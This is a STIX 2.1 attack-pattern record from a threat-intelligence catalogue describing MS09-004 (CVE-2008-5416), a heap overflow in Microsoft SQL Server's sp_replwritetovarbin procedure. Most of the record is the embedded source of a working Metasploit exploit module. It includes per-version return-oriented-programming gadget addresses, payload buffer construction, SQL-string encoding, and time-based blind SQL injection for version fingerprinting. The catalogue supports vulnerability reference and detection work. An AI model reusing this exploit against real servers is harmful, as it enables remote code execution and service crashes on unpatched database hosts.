{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9c8d477-7e6d-44ef-9f41-85a5eb9f7bbc",
    "created": "2024-08-14T16:39:49.111952Z",
    "modified": "2024-08-14T16:39:49.111957Z",
    "name": "MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection",
    "description": " A heap-based buffer overflow can occur when calling the undocumented \"sp_replwritetovarbin\" extended stored procedure. This vulnerability affects all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004. Microsoft patched this vulnerability in SP3 for 2005 without any public mention.  This exploit smashes several pointers, as shown below.  1. pointer to a 32-bit value that is set to 0 2. pointer to a 32-bit value that is set to a length influenced by the buffer length. 3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000 this value is referenced with a displacement of 0x38. For MSSQL 2005, the displacement is 0x10. The address of our buffer is conveniently stored in ecx when this instruction is executed. 4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with a displacement of 4. This pointer is not used by this exploit.  This particular exploit replaces the previous dual-method exploit. It uses a technique where the value contained in ecx becomes the stack. From there return oriented programming is used to normalize the execution state and finally execute the payload via a \"jmp esp\". All addresses used were found within the sqlservr.exe memory space, yielding very reliable code execution using only a single query.  NOTE: The MSSQL server service does not automatically restart by default. That said, some exceptions are caught and will not result in terminating the process. If the exploit crashes the service prior to hijacking the stack, it won't die. Otherwise, it's a goner. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mssql/ms09_004_sp_replwritetovarbin_sqli.rb",
            "external_id": "ms09_004_sp_replwritetovarbin_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5416"
        },
        {
            "source_name": "reference",
            "url": "http://www.secforce.co.uk/blog/2011/01/exploiting-ms09-004-via-sql-injection/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MSSQL_SQLI\n\n  def initialize(info = {})\n\n    super(update_info(info,\n      'Name'           => 'MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection',\n      'Description'    => %q{\n          A heap-based buffer overflow can occur when calling the undocumented\n        \"sp_replwritetovarbin\" extended stored procedure. This vulnerability affects\n        all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database,\n        and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004.\n        Microsoft patched this vulnerability in SP3 for 2005 without any public\n        mention.\n\n        This exploit smashes several pointers, as shown below.\n\n        1. pointer to a 32-bit value that is set to 0\n        2. pointer to a 32-bit value that is set to a length influenced by the buffer\n          length.\n        3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000,\n          this value is referenced with a displacement of 0x38. For MSSQL 2005, the\n          displacement is 0x10. The address of our buffer is conveniently stored in\n          ecx when this instruction is executed.\n        4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with\n          a displacement of 4. This pointer is not used by this exploit.\n\n        This particular exploit replaces the previous dual-method exploit. It uses\n        a technique where the value contained in ecx becomes the stack. From there,\n        return oriented programming is used to normalize the execution state and\n        finally execute the payload via a \"jmp esp\". All addresses used were found\n        within the sqlservr.exe memory space, yielding very reliable code execution\n        using only a single query.\n\n        NOTE: The MSSQL server service does not automatically restart by default. That\n        said, some exceptions are caught and will not result in terminating the process.\n        If the exploit crashes the service prior to hijacking the stack, it won't die.\n        Otherwise, it's a goner.\n      },\n      'Author'         =>\n        [\n          'jduck',          # MS09-004 base exploit\n          'Rodrigo Marcos'  # SQL Injection mods\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '50589' ],\n          [ 'CVE', '2008-5416' ],\n          [ 'BID', '32710' ],\n          [ 'MSB', 'MS09-004' ],\n          [ 'EDB', '7501' ],\n          [ 'URL', 'http://www.secforce.co.uk/blog/2011/01/exploiting-ms09-004-via-sql-injection/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\", # bad bytes get encoded!\n          'PrependEncoder' => \"\\x81\\xc4\\xf0\\xef\\xff\\xff\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          # auto targeting!\n          [ 'Automatic', { } ],\n\n          #\n          # Individual targets\n          #\n          [\n            # Microsoft SQL Server  2000 - 8.00.194 (Intel X86)\n            # Aug  6 2000 00:57:48\n            'MSSQL 2000 / MSDE SP0 (8.00.194)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash\n              'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x00a87f26,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x6900a7,    # not directly used - call [ecx+0x08]\n              'Disp'     => 0x08,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x0041b78f,  # xchg ecx,esp / sbb [eax],al / pop esi / ret\n              'Popped'   => 0x4,         # byte count popped in above (before ret)\n              'Offset'   => 0x28,        # offset to the new stack!\n              'FixESP'   => 0x0071f5fb,  # advance esp to next ret (add esp,0x20 / ret)\n              'Ret'      => 0x0041c9a2   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server  2000 - 8.00.384 (Intel X86)\n            # May 23 2001 00:02:52\n            'MSSQL 2000 / MSDE SP1 (8.00.384)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash\n              'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x00a95b2f,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x4b4f00,    # not directly used - call [ecx-0x18]\n              'Disp'     => 0x34,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x0044d300,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret\n              'Popped'   => 0x8,         # byte count popped in above (before ret)\n              'Offset'   => 0x28,        # offset to the new stack!\n              'FixESP'   => 0x004a2ce9,  # advance esp to next ret (add esp,0x1c / ret)\n              'Ret'      => 0x004caa15   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server  2000 - 8.00.534 (Intel X86)\n            # Nov 19 2001 13:23:50\n            'MSSQL 2000 / MSDE SP2 (8.00.534)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash\n              'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x00a64f7e,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x660077,    # not directly used - call [ecx-0x18]\n              'Disp'     => 0x34,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x0054131c,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret\n              'Popped'   => 0x8,         # byte count popped in above (before ret)\n              'Offset'   => 0x28,        # offset to the new stack!\n              'FixESP'   => 0x005306a0,  # advance esp to next ret (add esp,0x1c / ret)\n              'Ret'      => 0x004ca984   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server  2000 - 8.00.760 (Intel X86)\n            # Dec 17 2002 14:22:05\n            'MSSQL 2000 / MSDE SP3 (8.00.760)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash\n              'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x00ac344e,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x490074,    # not directly used - call [ecx+0x14]\n              'Disp'     => 0x34,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x00454303,  # xchg ecx,esp / add [eax],al / add [edi+0x5e],bl / pop ebx / pop ebp / ret\n              'Popped'   => 0x8,         # byte count popped in above (before ret)\n              'Offset'   => 0x28,        # offset to the new stack!\n              'FixESP'   => 0x00503413,  # advance esp to next ret (add esp,0x20 / ret)\n              'Ret'      => 0x0043fa97   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)\n            # May  3 2005 23:18:38\n            'MSSQL 2000 / MSDE SP4 (8.00.2039)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => -13,         # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x38,        # displacement from call [eax+0x38] crash\n              'Writable' => 0x42b6cfe0,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x0046592e,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x69f5e8,    # not directly used - call [ecx+0x14]\n              'Disp'     => 0x14,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x007b39a8,  # push ecx / pop esp / mov ax,[eax+0x18] / mov [ecx+0x62],ax / pop ebp / ret 0x4\n              'Popped'   => 0x4,         # byte count popped in above (before ret)\n              'Offset'   => 0x20,        # offset to the new stack!\n              'FixESP'   => 0x00b3694d,  # advance esp to next ret (add esp,0x20 / ret)\n              'Ret'      => 0x0047c89d   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)\n            # Oct 14 2005 00:33:37\n            'MSSQL 2005 SP0 (9.00.1399.06)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => 63,          # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash\n              'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x02201ca8,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x10e860f,   # not directly used - call [ecx+0x14]\n              'Disp'     => 0x50,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x0181c0d4,  # push ecx / pop esp / pop ebp / ret\n              'Popped'   => 0x4,         # byte count popped in above (before ret)\n              'Offset'   => 0x20,        # offset to the new stack!\n              'FixESP'   => 0x0147deb7,  # advance esp to next ret (add esp,0x10 / ret)\n              'Ret'      => 0x0112c2c7   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server 2005 - 9.00.2047.00 (Intel X86)\n            # Apr 14 2006 01:12:25\n            'MSSQL 2005 SP1 (9.00.2047.00)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => 63,          # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash\n              'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x0244c803,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x17139e9,   # not directly used - call [ecx+0x14]\n              'Disp'     => 0x52,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x0183bf9c,  # push ecx / pop esp / pop ebp / ret\n              'Popped'   => 0x4,         # byte count popped in above (before ret)\n              'Offset'   => 0x20,        # offset to the new stack!\n              'FixESP'   => 0x014923c1,  # advance esp to next ret (add esp,0x10 / ret)\n              'Ret'      => 0x011b204c   # jmp esp\n            },\n          ],\n\n          [\n            # Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86)\n            # Feb  9 2007 22:47:07\n            'MSSQL 2005 SP2 (9.00.3042.00)',\n            {\n              'Num'      => 32,          # value for \"start_offset\"\n              'VtOff'    => 63,          # offset from 'Num' to smashed vtable ptr\n              'VtDisp'   => 0x10,        # displacement from mov eax,[edx+0x10] / call eax crash\n              'Writable' => 0x53ad5330,  # any writable addr (not even necessary really)\n              'Vtable'   => 0x027fca52,  # becomes eax for [eax+0x38] (must be valid to exec)\n              'FixDisp'  => 0x1106d6b,   # not directly used - call [ecx+0x14]\n              'Disp'     => 0x52,        # displacement on call [ecx+disp] used\n              'ecx2esp'  => 0x01849641,  # push ecx / pop esp / pop ebp / ret\n              'Popped'   => 0x4,         # byte count popped in above (before ret)\n              'Offset'   => 0x20,        # offset to the new stack!\n              'FixESP'   => 0x01498b22,  # advance esp to next ret (add esp,0x10 / ret)\n              'Ret'      => 0x010a5379   # jmp esp\n            },\n          ],\n\n          [ 'CRASHER', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-12-09'\n      ))\n\n  end\n\n  def check\n    # the ping to port 1434 method has two drawbacks...\n    # #1, it doesn't work on mssql 2005 or newer (localhost only listening)\n    # #2, it doesn't give an accurate version number (sp/os)\n\n    # since we need to have credentials for this vuln, we just login and run a query\n    # to get the version information\n    version = mssql_query_version\n    unless version\n      return Exploit::CheckCode::Safe\n    end\n    print_status(\"@@version returned:\\n\\t\" + version)\n\n    # Any others?\n    return Exploit::CheckCode::Appears if (version =~ /8\\.00\\.194/)\n    return Exploit::CheckCode::Appears if (version =~ /8\\.00\\.384/)\n    return Exploit::CheckCode::Appears if (version =~ /8\\.00\\.534/)\n    return Exploit::CheckCode::Appears if (version =~ /8\\.00\\.760/)\n    return Exploit::CheckCode::Appears if (version =~ /8\\.00\\.2039/)\n    return Exploit::CheckCode::Appears if (version =~ /9\\.00\\.1399\\.06/)\n    return Exploit::CheckCode::Appears if (version =~ /9\\.00\\.2047\\.00/)\n    return Exploit::CheckCode::Appears if (version =~ /9\\.00\\.3042\\.00/)\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    mytarget = nil\n    if target.name =~ /Automatic/\n      print_status(\"Attempting automatic target detection...\")\n\n      version = mssql_query_version\n      fail_with(Failure::NoAccess, \"Unable to get version!\") if not version\n\n      if (version =~ /8\\.00\\.194/)\n        mytarget = targets[1]\n      elsif (version =~ /8\\.00\\.384/)\n        mytarget = targets[2]\n      elsif (version =~ /8\\.00\\.534/)\n        mytarget = targets[3]\n      elsif (version =~ /8\\.00\\.760/)\n        mytarget = targets[4]\n      elsif (version =~ /8\\.00\\.2039/)\n        mytarget = targets[5]\n      elsif (version =~ /9\\.00\\.1399\\.06/)\n        mytarget = targets[6]\n      elsif (version =~ /9\\.00\\.2047\\.00/)\n        mytarget = targets[7]\n      elsif (version =~ /9\\.00\\.3042\\.00/)\n        mytarget = targets[8]\n      end\n\n      if mytarget.nil?\n        fail_with(Failure::NoTarget, \"Unable to automatically detect the target\")\n      else\n        print_status(\"Automatically detected target \\\"#{mytarget.name}\\\"\")\n      end\n    else\n      mytarget = target\n    end\n\n    sqlquery = %Q|declare @i int,@z nvarchar(4000)\nset @z='declare @e int,@b varbinary,@l int;'\nset @z=@z+'exec sp_replwritetovarbin %NUM%,@e out,@b out,@l out,''%STUFF%'',@l,@l,@l,@l,@l,@l,@l,@l'\nexec sp_executesql @z|\n\n    # just crash it with a pattern buffer if the CRASHER target is selected..\n    if mytarget.name == 'CRASHER'\n      sploit = Rex::Text.pattern_create(2048)\n      print_status(\"Attempting to corrupt memory to cause an exception!\")\n      num = 32\n    else\n      # trigger the memory corruption\n      num = mytarget['Num']\n      vt_off = mytarget['VtOff']\n      vt_disp = mytarget['VtDisp']\n      vtable = mytarget['Vtable']\n      ecx_disp = mytarget['Disp']\n      esp_off = mytarget['Offset']\n      hijack_esp = mytarget['ecx2esp']\n      first_esp = mytarget['Popped']\n      fix_esp = mytarget['FixESP']\n      writable = mytarget['Writable']\n      corruptable_bytes = 0x44\n\n      # make sploit buff\n      sz = (num + vt_off) + esp_off + (2 + corruptable_bytes) + payload.encoded.length\n      #sploit = Rex::Text.pattern_create(sz)\n      sploit = rand_text_alphanumeric(sz)\n\n      # remove displacement! (using call [ecx+displacement])\n      vtable_off = (num + vt_off)\n      sploit[vtable_off,4] = [(vtable - vt_disp)].pack('V')\n\n      # stack -> heap\n      hijack_off = vtable_off + ecx_disp\n      sploit[hijack_off,4] = [hijack_esp].pack('V')\n      # becomes eax on mssql 2ksp4 (prevent crash)\n      sploit[(vtable_off-4),4] = [writable].pack('V')\n\n      # becomes eip after esp hijack\n      fixesp_off = vtable_off + first_esp\n      sploit[fixesp_off,4] = [fix_esp].pack('V')\n\n      # rest of magic stack (disable DEP?)\n      stack_off = vtable_off + esp_off\n      stack = []\n      stack << mytarget['Ret']\n      stack = stack.pack('V*')\n      # jump over the stuff that gets corrupted\n      stack << \"\\xeb\" + [corruptable_bytes].pack('C')\n      stack << rand_text_alphanumeric(corruptable_bytes)\n      stack << payload.encoded\n      sploit[stack_off,stack.length] = stack\n\n      # this has to be put in after the stack area since the ptr for sql2k sp1 is in the corrupted stuff\n      sploit[hijack_off,4] = [hijack_esp].pack('V')\n\n      print_status(\"Redirecting flow to %#x via call to our faked vtable ptr @ %#x\" % [mytarget['FixDisp'], vtable])\n    end\n\n    # encode chars that get modified\n    enc = mssql_encode_string(sploit)\n\n    # put the number in (start offset)\n    runme = sqlquery.gsub(/%NUM%/, num.to_s)\n    runme.gsub!(/%STUFF%/, enc)\n\n    # go!\n    print_status('The SQL Server will probably die after exploitation. Follow the \"POSTEXPLOITATION\" instructions in the README file')\n    begin\n      mssql_query(runme, datastore['VERBOSE'])\n    rescue ::Errno::ECONNRESET, EOFError\n      print_error(\"Error: #{$!}\")\n    end\n\n    handler\n    disconnect\n  end\n\n\n  def mssql_str_to_chars(str)\n    ret = \"\"\n    str.unpack('C*').each do |ch|\n      ret += \"+\" if ret.length > 0\n      ret += \"char(\"\n      ret << ch.to_s\n      ret += \")\"\n    end\n    return ret\n  end\n\n\n  def mssql_encode_string(str)\n    badchars = \"\\x00\\x80\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8e\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9e\\x9f\"\n\n    enc = \"\"\n    in_str = true\n    str.unpack('C*').each do |ch|\n      # double-double single quotes\n      if ch == 0x27\n        if not in_str\n          enc << \"+'\"\n          in_str = true\n        end\n        enc << ch.chr * 4\n        next\n      end\n\n      # double backslashes\n      if ch == 0x5c\n        if not in_str\n          enc << \"+'\"\n          in_str = true\n        end\n        enc << ch.chr * 2\n        next\n      end\n\n      # convert any bad stuff to char(0xXX)\n      if badchars.index(ch.chr)\n        enc << \"'\" if in_str\n        enc << \"+char(0x%x)\" % ch\n        in_str = false\n      else\n        enc << \"+'\" if not in_str\n        enc << ch.chr\n        in_str = true\n      end\n    end\n    enc << \"+'\" if not in_str\n    return enc\n  end\n\n\n  def mssql_query_version\n\n    delay = 5\n\n    # Let's first check that we can reach the host with no problems\n    t = Time.now\n    res = mssql_query(\"select @@version\",datastore['VERBOSE'])\n    response_time = Time.now-t\n    if (response_time > delay)\n      return nil\n    end\n\n    # Now we test the SQL Server versions\n    versions = %w[8.00.194 8.00.384 8.00.534 8.00.760 8.00.2039 9.00.1399.06 9.00.2047.00 9.00.3042.00]\n    versions.each_with_index { |version,i|\n      t = Time.now\n      res = mssql_query(\"if ((select PATINDEX('%#{version}%', @@version))>0)WAITFOR DELAY '00:00:#{delay.to_s}'\",datastore['VERBOSE'])\n      response_time = Time.now-t\n      if (response_time > delay)\n        return version\n      end\n    }\n\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-12-09",
    "x_mitre_platforms": [
        "win'"
    ]
}